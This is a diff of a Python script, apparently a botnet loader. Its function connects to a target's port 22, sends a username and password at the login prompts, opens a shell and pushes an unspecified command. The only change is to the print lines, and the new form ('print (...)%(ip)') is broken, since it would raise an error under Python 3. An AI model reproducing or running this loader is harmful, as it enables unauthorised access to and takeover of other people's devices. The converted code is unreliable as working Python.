@@ -21,14 +21,14 @@ def tragedy(ip,username,password):
 		tn.settimeout(5)
 		tn.connect((ip,22))
 	except Exception:
-		print "\x1b[31m[+] Failed To Connect! -> %s\x1b[0m"%(ip)
+		print ("\x1b[31m[+] Failed To Connect! -> %s\x1b[0m")%(ip)
 		tn.close()
 	try:
 		tragic = ''
 		tragic += readUntil(tn, "ogin")
 		if "ogin" in tragic:
 			tn.send(username + "\n")
-			print "\x1b[1;33m[+] Sending Username! -> %s\x1b[0m"%(ip)
+			print ("\x1b[1;33m[+] Sending Username! -> %s\x1b[0m")%(ip)
 			time.sleep(0.09)
 		else:
 			pass
@@ -39,7 +39,7 @@ def tragedy(ip,username,password):
 		tragic += readUntil(tn, "assword:")
 		if "assword" in tragic:
 			tn.send(password + "\n")
-			print "\x1b[1;33m[+] Sending Password! -> %s\x1b[0m"%(ip)
+			print ("\x1b[1;33m[+] Sending Password! -> %s\x1b[0m")%(ip)
 			time.sleep(2)
 		else:
 			pass
@@ -49,7 +49,7 @@ def tragedy(ip,username,password):
 		tn.send("sh" + "\n")
 		time.sleep(0.05)
 		tn.send(cmd + "\n")
-		print "\x1b[32m[+] Command Sent! -> %s\x1b[0m"%(ip)
+		print ("\x1b[32m[+] Command Sent! -> %s\x1b[0m")%(ip)
 		time.sleep(15)
 		tn.close()
 	except Exception:
